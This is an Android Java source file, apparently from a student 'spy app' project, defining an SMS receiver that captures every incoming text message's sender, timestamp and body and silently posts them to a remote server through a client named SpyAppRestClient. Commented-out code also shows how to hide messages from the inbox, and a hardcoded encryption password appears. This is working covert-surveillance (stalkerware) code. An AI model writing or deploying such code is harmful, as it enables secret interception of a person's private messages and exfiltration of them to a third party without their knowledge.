package com.example.natalia.super_inzynierka;

import android.content.*;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.LogHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;

import java.util.Calendar;

/**
 * Created by Natalia on 25.11.2016.
 */

public class SmsReceiver extends BroadcastReceiver
{
    // All available column names in SMS table
    // [_id, thread_id, address,
    // person, date, protocol, read,
    // status, type, reply_path_present,
    // subject, body, service_center,
    // locked, error_code, seen]

    public static final String SMS_EXTRA_NAME = "pdus";
    public static final String SMS_URI = "content://sms";

    public static final String ADDRESS = "address";
    public static final String PERSON = "person";
    public static final String DATE = "date";
    public static final String READ = "read";
    public static final String STATUS = "status";
    public static final String TYPE = "type";
    public static final String BODY = "body";
    public static final String SEEN = "seen";

    public static final int MESSAGE_TYPE_INBOX = 1;
    public static final int MESSAGE_TYPE_SENT = 2;

    public static final int MESSAGE_IS_NOT_READ = 0;
    public static final int MESSAGE_IS_READ = 1;

    public static final int MESSAGE_IS_NOT_SEEN = 0;
    public static final int MESSAGE_IS_SEEN = 1;

    // Change the password here or give a user possibility to change it
    public static final byte[] PASSWORD = new byte[]{ 0x20, 0x32, 0x34, 0x47, (byte) 0x84, 0x33, 0x58 };

    public void onReceive( Context context, Intent intent )
    {

        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            //do something with the received sms
            System.out.println("SMS RECEIVED");
        }else  if(intent.getAction().equals("android.provider.Telephony.SMS_SENT")){
            //do something with the sended sms
            System.out.println("SMS SENT");
        }

        System.out.println("ON RECEIVE SMS");
        // Get SMS map from Intent
        Bundle extras = intent.getExtras();

        String messages = "";

        if ( extras != null )
        {
            // Get received SMS array
            Object[] smsExtra = (Object[]) extras.get( SMS_EXTRA_NAME );

            // Get ContentResolver object for pushing encrypted SMS to incoming folder
            ContentResolver contentResolver = context.getContentResolver();

            for ( int i = 0; i < smsExtra.length; ++i )
            {
                SmsMessage sms = SmsMessage.createFromPdu((byte[])smsExtra[i]);

                System.out.println(sms.getStatus());
                String body = sms.getMessageBody().toString();
                String address = sms.getOriginatingAddress();
                long date = sms.getTimestampMillis();

                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(date);

                String min;
                int mYear = calendar.get(Calendar.YEAR);
                int mMonth = calendar.get(Calendar.MONTH);
                int mDay = calendar.get(Calendar.DAY_OF_MONTH);
                int hour = calendar.get(Calendar.HOUR_OF_DAY);
                int minute = calendar.get(Calendar.MINUTE);
                if (minute < 10) {
                    min = "0" + minute;
                } else {
                    min = Integer.toString(minute);
                }
                String time = mDay + "-" + mMonth + "-" + mYear + "  " + hour + ":" + min;

                messages += "SMS from " + address + " :\n";
                messages += body + "\n";

                // Here you can add any your code to work with incoming SMS
                // I added encrypting of all received SMS

//                putSmsToDatabase( contentResolver, sms );
                postRequest(address, time, body);
            }

            // Display SMS message
//            Toast.makeText( context, messages, Toast.LENGTH_SHORT ).show();



        }

        // WARNING!!!
        // If you uncomment next line then received SMS will not be put to incoming.
        // Be careful!
        // this.abortBroadcast();
    }

//    private void putSmsToDatabase( ContentResolver contentResolver, SmsMessage sms )
//    {
//        // Create SMS row
//        ContentValues values = new ContentValues();
//        values.put( ADDRESS, sms.getOriginatingAddress() );
//        values.put( DATE, sms.getTimestampMillis() );
//        values.put( READ, MESSAGE_IS_NOT_READ );
//        values.put( STATUS, sms.getStatus() );
//        values.put( TYPE, MESSAGE_TYPE_INBOX );
//        values.put( SEEN, MESSAGE_IS_NOT_SEEN );
//        try
//        {
//            String encryptedPassword = StringCryptor.encrypt( new String(PASSWORD), sms.getMessageBody().toString() );
//            values.put( BODY, encryptedPassword );
//        }
//        catch ( Exception e )
//        {
//            e.printStackTrace();
//        }
//
//        // Push row into the SMS table
//        contentResolver.insert( Uri.parse( SMS_URI ), values );
//    }



    public void postRequest(String number, String date, String text) {
        RequestParams params = new RequestParams();
        params.put("number", number);
        params.put("start_time", date);
        params.put("text", text);
        SpyAppRestClient.post("create_message/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
            }
        });
    }
}
